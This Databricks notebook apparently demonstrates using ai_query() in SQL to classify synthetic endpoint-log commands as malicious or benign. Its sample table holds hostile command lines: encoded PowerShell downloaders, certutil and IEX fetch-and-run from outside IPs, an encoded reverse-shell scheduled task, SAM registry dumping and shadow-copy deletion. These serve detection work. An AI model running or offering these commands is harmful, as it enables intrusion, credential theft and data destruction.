# Databricks notebook source
# MAGIC %md
# MAGIC # LLMs Natively Inside SQL — `ai_query()`
# MAGIC An analyst who knows SQL can apply Foundation Models to millions of log rows —
# MAGIC no Python, no API keys, no external services. The model runs inside Databricks.
# MAGIC
# MAGIC ---
# MAGIC **About this demo:** This is not a Databricks product. It is a working demonstration built on the Databricks platform
# MAGIC using Serverless SQL, Foundation Model APIs, and Unity Catalog. The data is synthetic and the endpoint log commands
# MAGIC are illustrative. Source code: [github.com/wryszka/secops_demo](https://github.com/wryszka/secops_demo)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Step 1: Create realistic endpoint logs with suspicious commands
# MAGIC These simulate EDR (Endpoint Detection & Response) telemetry — a mix of normal
# MAGIC admin activity and obfuscated attack payloads.

# COMMAND ----------

# MAGIC %sql
# MAGIC CREATE OR REPLACE TABLE lr_serverless_aws_us_catalog.secops_demo.endpoint_logs AS
# MAGIC SELECT * FROM VALUES
# MAGIC   ('EP-1001', 'workstation-042', 'jsmith', 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1MC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=', '2024-03-15T09:23:41Z', 'CRITICAL'),
# MAGIC   ('EP-1002', 'dc-primary', 'admin', 'cmd.exe /c whoami /all && net group "Domain Admins" /domain && nltest /dclist:', '2024-03-15T09:24:02Z', 'HIGH'),
# MAGIC   ('EP-1003', 'workstation-107', 'mjones', 'outlook.exe', '2024-03-15T09:24:15Z', 'INFO'),
# MAGIC   ('EP-1004', 'server-web-03', 'svc_iis', 'certutil.exe -urlcache -split -f http://45.155.205.233/beacon.exe C:\Windows\Temp\svchost.exe && C:\Windows\Temp\svchost.exe', '2024-03-15T09:25:33Z', 'CRITICAL'),
# MAGIC   ('EP-1005', 'workstation-042', 'jsmith', 'chrome.exe --new-tab https://mail.google.com', '2024-03-15T09:26:01Z', 'INFO'),
# MAGIC   ('EP-1006', 'server-db-01', 'svc_sql', 'reg.exe save HKLM\SAM C:\temp\sam.save && reg.exe save HKLM\SYSTEM C:\temp\sys.save', '2024-03-15T09:27:44Z', 'CRITICAL'),
# MAGIC   ('EP-1007', 'workstation-089', 'analyst2', 'python3 /opt/tools/scan_report.py --output pdf', '2024-03-15T09:28:00Z', 'INFO'),
# MAGIC   ('EP-1008', 'server-web-03', 'svc_iis', 'powershell.exe -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://89.248.167.131:8080/shell.ps1'')"', '2024-03-15T09:29:12Z', 'CRITICAL'),
# MAGIC   ('EP-1009', 'workstation-023', 'tchen', 'notepad.exe C:\Users\tchen\Documents\meeting_notes.txt', '2024-03-15T09:30:00Z', 'INFO'),
# MAGIC   ('EP-1010', 'dc-primary', 'admin', 'schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "powershell -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgTgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADAALgA1AC4AMgAyACcALAA0ADQANAA0ACkA"', '2024-03-15T09:31:55Z', 'CRITICAL'),
# MAGIC   ('EP-1011', 'workstation-107', 'mjones', 'teams.exe', '2024-03-15T09:32:10Z', 'INFO'),
# MAGIC   ('EP-1012', 'server-file-01', 'svc_backup', 'vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete', '2024-03-15T09:33:28Z', 'CRITICAL')
# MAGIC AS t(endpoint_id, hostname, username, raw_command, event_time, alert_level);

# COMMAND ----------

# MAGIC %md
# MAGIC ## Step 2: Preview the data
# MAGIC Look at this as a SOC analyst would — some commands look normal, some look terrifying.

# COMMAND ----------

# MAGIC %sql
# MAGIC SELECT endpoint_id, hostname, username, alert_level,
# MAGIC        LEFT(raw_command, 80) as command_preview
# MAGIC FROM lr_serverless_aws_us_catalog.secops_demo.endpoint_logs
# MAGIC ORDER BY event_time;

# COMMAND ----------

# MAGIC %md
# MAGIC ## Step 3: The Magic — AI Classification Inside SQL
# MAGIC No Python. No API keys. No external service. Just SQL + a Foundation Model.
# MAGIC
# MAGIC A junior analyst who knows `SELECT ... FROM` can now classify malware at scale.

# COMMAND ----------

# MAGIC %sql
# MAGIC SELECT
# MAGIC   endpoint_id,
# MAGIC   hostname,
# MAGIC   username,
# MAGIC   LEFT(raw_command, 60) as command_preview,
# MAGIC   ai_query(
# MAGIC     'databricks-meta-llama-3-3-70b-instruct',
# MAGIC     'You are a malware analyst. Analyze this command line from an endpoint log. '
# MAGIC     || 'Return ONLY one word: MALICIOUS or BENIGN. '
# MAGIC     || 'Command: ' || raw_command
# MAGIC   ) as ai_verdict
# MAGIC FROM lr_serverless_aws_us_catalog.secops_demo.endpoint_logs
# MAGIC ORDER BY event_time;

# COMMAND ----------

# MAGIC %md
# MAGIC ## Step 4: Go deeper — AI explains the attack technique
# MAGIC Same SQL pattern, but now we ask the model to explain *what* the attack is doing.

# COMMAND ----------

# MAGIC %sql
# MAGIC SELECT
# MAGIC   endpoint_id,
# MAGIC   hostname,
# MAGIC   raw_command,
# MAGIC   ai_query(
# MAGIC     'databricks-meta-llama-3-3-70b-instruct',
# MAGIC     'You are a senior threat analyst. Analyze this command from an endpoint log. '
# MAGIC     || 'In exactly 2 sentences: (1) classify as MALICIOUS or BENIGN, '
# MAGIC     || '(2) if malicious, name the MITRE ATT&CK technique. '
# MAGIC     || 'Command: ' || raw_command
# MAGIC   ) as ai_analysis
# MAGIC FROM lr_serverless_aws_us_catalog.secops_demo.endpoint_logs
# MAGIC WHERE alert_level IN ('CRITICAL', 'HIGH')
# MAGIC ORDER BY event_time;

# COMMAND ----------

# MAGIC %md
# MAGIC ## Step 5: At scale — join AI verdicts with firewall data
# MAGIC Combine endpoint AI classification with the firewall SIEM feed to correlate threats.

# COMMAND ----------

# MAGIC %sql
# MAGIC SELECT
# MAGIC   e.endpoint_id,
# MAGIC   e.hostname,
# MAGIC   f.src_ip,
# MAGIC   f.threat_type,
# MAGIC   LEFT(e.raw_command, 50) as command_preview,
# MAGIC   ai_query(
# MAGIC     'databricks-meta-llama-3-3-70b-instruct',
# MAGIC     'Classify this command as MALICIOUS or BENIGN in one word: ' || e.raw_command
# MAGIC   ) as ai_verdict
# MAGIC FROM lr_serverless_aws_us_catalog.secops_demo.endpoint_logs e
# MAGIC JOIN lr_serverless_aws_us_catalog.secops_demo.high_value_siem_feed f
# MAGIC   ON e.alert_level = 'CRITICAL' AND f.action = 'THREAT'
# MAGIC WHERE f.src_ip IN ('89.248.167.131', '45.155.205.233')
# MAGIC LIMIT 10;
